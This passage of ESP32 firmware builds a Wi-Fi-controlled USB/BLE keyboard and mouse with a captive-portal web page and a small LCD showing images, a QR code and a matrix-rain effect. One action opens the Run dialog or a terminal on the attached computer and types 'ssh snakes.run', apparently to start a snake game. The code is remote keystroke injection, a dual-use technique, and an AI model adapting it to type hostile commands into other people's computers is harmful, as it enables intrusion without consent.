            else if(act=="snake") { if(targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press('r'); delay(300); activeDriver->releaseAll(); delay(800); activeDriver->println("cmd /c \"ssh snakes.run\""); } else { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(1000); if(sp) activeDriver->print(" "); activeDriver->println("ssh snakes.run"); } }
            else if(act.startsWith("m_") && act != "m_scr") { activeDriver->mediaAction(act); }
            else if(act=="m_scr") { 
                if(targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press(KEY_LEFT_SHIFT); activeDriver->press('s'); delay(100); activeDriver->releaseAll(); }
                else { activeDriver->printScreen(); }
            }
            setLastKey(act); 
        }
                else if (msg.startsWith("W:")) {
            activeDriver->mouseScroll(msg.substring(2).toInt());
        }
        else if (msg.startsWith("B:list")) {
            String json = bleDriver.getBondedDevices();
            ws.text(info->num, "B:" + json);
        }
        else if (msg.startsWith("B:conn:")) {
            bleDriver.connectToDevice(msg.substring(7));
        }
        else if (msg.startsWith("B:ren:")) {
            int i = msg.indexOf(':', 6);
            if(i > 0) bleDriver.renameDevice(msg.substring(6, i), msg.substring(i+1));
            ws.text(info->num, "B:" + bleDriver.getBondedDevices());
        }
        else if (msg.startsWith("B:del:")) {
            bleDriver.deleteDevice(msg.substring(6));
            ws.text(info->num, "B:" + bleDriver.getBondedDevices());
        }
        else if (msg.startsWith("T:")) { setHidMode(msg.substring(2) == "ble"); }
        else if (msg.startsWith("O:")) { targetOS = msg.substring(2); }
        else if (msg.startsWith("I:clear")) { show_img = false; gif_mode = false; gif_count = 0; }
        else if (msg.startsWith("I:gif")) { gif_mode = true; gif_count = 0; gif_idx = 0; show_img = false; }
        else if (msg.startsWith("I:img")) { gif_mode = false; gif_count = 0; show_img = true; }
    } else if (info->opcode == WS_BINARY) {
        if (info->index == 0) binaryOffset = 0;
        if (binaryOffset + len <= 25600) {
            memcpy(((uint8_t*)custom_img_buf) + binaryOffset, data, len);
            binaryOffset += len;
            if (binaryOffset == 25600) {
                if(gif_mode && gif_count < 15) {
                    if(gif_storage[gif_count]) free(gif_storage[gif_count]);
                    gif_storage[gif_count] = (uint16_t*)malloc(25600);
                    if(gif_storage[gif_count]) memcpy(gif_storage[gif_count], custom_img_buf, 25600);
                    gif_count++;
                }
                if (!gif_mode) show_img = true;
                else if (gif_count > 1) show_img = true;
            }
        }
    }
}

void updateDisplay() {
    if (show_img) {
        if(gif_mode && gif_count > 1) {
            if(millis() - last_gif_ms > 150) {
                last_gif_ms = millis();
                memcpy(screen_buf, gif_storage[gif_idx], 25600);
                gif_idx = (gif_idx + 1) % gif_count;
            }
        } else {
            memcpy(screen_buf, custom_img_buf, 25600);
        }
    } else {
        int clients = WiFi.softAPgetStationNum();
        if (clients > 0 && ws.count() == 0) {
            for(int i=0; i<160*80; i++) screen_buf[i] = SWAP(C_BLACK);
            int sc = 3; int ox = (160 - qr_size * sc) / 2; int oy = (80 - qr_size * sc) / 2;
            for(int y=0; y<qr_size; y++) {
                for(int x=0; x<qr_size; x++) {
                    uint16_t c = qr_data[y * qr_size + x] ? C_BLACK : C_WHITE;
                    for(int sy=0; sy<sc; sy++) for(int sx=0; sx<sc; sx++) screen_buf[(oy + y*sc + sy)*160 + (ox + x*sc + sx)] = SWAP(c);
                }
            }
        } else {
            if (ws.count() > 0) user_on_site = true; else user_on_site = false;
            static int drops[160]; static bool init = false;
            if (!init) { for(int i=0; i<160; i++) drops[i] = random(-100, 0); init = true; }
            for(int i=0; i<160*80; i++) {
                uint16_t c = screen_buf[i];
                if (c == SWAP(C_RED)) screen_buf[i] = SWAP(C_BLACK);
                else if (c != SWAP(C_BLACK)) {
                    uint16_t ns = SWAP(c);
                    uint16_t r = (ns >> 11) & 0x1F; uint16_t g = (ns >> 5) & 0x3F; uint16_t b = ns & 0x1F;
                    if(g > 2) g -= 2; else g = 0; if(r > 4) r -= 4; else r = 0; if(b > 4) b -= 4; else b = 0;
                    screen_buf[i] = SWAP((r << 11) | (g << 5) | b);
                }
            }
            for(int x=0; x<160; x+=6) {
                if(drops[x] >= 0 && drops[x] < 80) {
                    screen_buf[drops[x] * 160 + x] = SWAP(C_GREEN);
                    if(x+1 < 160) screen_buf[drops[x] * 160 + x + 1] = SWAP(C_GREEN);
                }
                drops[x] += 1; if(drops[x] >= 80) drops[x] = random(-40, 0);
            }
            char info[32]; sprintf(info, "192.168.4.1 U:%d", clients);
            drawString(2, 2, info, C_WHITE, 1);
            if (millis() - lastKeyTime < 2000 && lastKey.length() > 0) {
                int len = lastKey.length(), sc = (len > 3) ? 2 : 4;
                int tx = (160 - (len * 6 * sc)) / 2, ty = (80 - 8 * sc) / 2;
                drawString(tx, ty, lastKey.c_str(), C_GREEN, sc);
            }
        }
    }
    if (showCursorFrames > 0) {
        for(int y=0; y<4; y++) for(int x=0; x<4; x++) screen_buf[(cursorY + y)*160 + (cursorX + x)] = SWAP(C_RED);
        showCursorFrames--;
    }
    esp_lcd_panel_draw_bitmap(panel_handle, 0, 0, 160, 80, screen_buf);
}

void setup_lcd() {
    spi_bus_config_t b = ST7735_PANEL_BUS_SPI_CONFIG(PIN_NUM_CLK, PIN_NUM_MOSI, 160 * 80 * 2);
    spi_bus_initialize(SPI2_HOST, &b, SPI_DMA_CH_AUTO);
    esp_lcd_panel_io_spi_config_t ioc = ST7735_PANEL_IO_SPI_CONFIG(PIN_NUM_CS, PIN_NUM_DC, NULL, NULL);
    esp_lcd_new_panel_io_spi((esp_lcd_spi_bus_handle_t)SPI2_HOST, &ioc, &io_handle);
    esp_lcd_panel_dev_config_t pc = { .reset_gpio_num = PIN_NUM_RST, .color_space = ESP_LCD_COLOR_SPACE_BGR, .bits_per_pixel = 16 };
    esp_lcd_new_panel_st7735(io_handle, &pc, &panel_handle);
    esp_lcd_panel_reset(panel_handle); esp_lcd_panel_init(panel_handle); esp_lcd_panel_invert_color(panel_handle, true);
    esp_lcd_panel_set_gap(panel_handle, 1, 26); esp_lcd_panel_swap_xy(panel_handle, true); esp_lcd_panel_mirror(panel_handle, false, true);
    esp_lcd_panel_disp_on_off(panel_handle, true); pinMode(PIN_NUM_BCKL, OUTPUT); digitalWrite(PIN_NUM_BCKL, 0);
}

void setup() {
    Serial.begin(115200);
    FastLED.addLeds<WS2812, LED_DI_PIN, GRB>(leds, NUM_LEDS);
    leds[0] = CRGB::Red; FastLED.show();
    WiFi.mode(WIFI_AP); WiFi.softAP(ssid);
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    usbDriver.begin();
    bleDriver.begin();
    setHidMode(false);
    setup_lcd();
    for(int i=0; i<15; i++) gif_storage[i] = NULL;
    ws.onEvent([](AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len){
        if(type == WS_EVT_DATA) handleWebSocketMessage(arg, data, len);
        else if(type == WS_EVT_DISCONNECT) { user_on_site = false; }
    });
    server.addHandler(&ws);
    server.on("/generate_204", [](AsyncWebServerRequest *request){ request->redirect("http://192.168.4.1/"); });
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){ request->send_P(200, "text/html", index_html); });
    server.onNotFound([](AsyncWebServerRequest *request){ request->redirect("http://192.168.4.1/"); });
    server.begin();
    leds[0] = CRGB::Blue; FastLED.show();
}

void loop() {
    dnsServer.processNextRequest(); ws.cleanupClients();
    static uint32_t last = 0; if(millis() - last > 50) { last = millis(); updateDisplay(); }
}
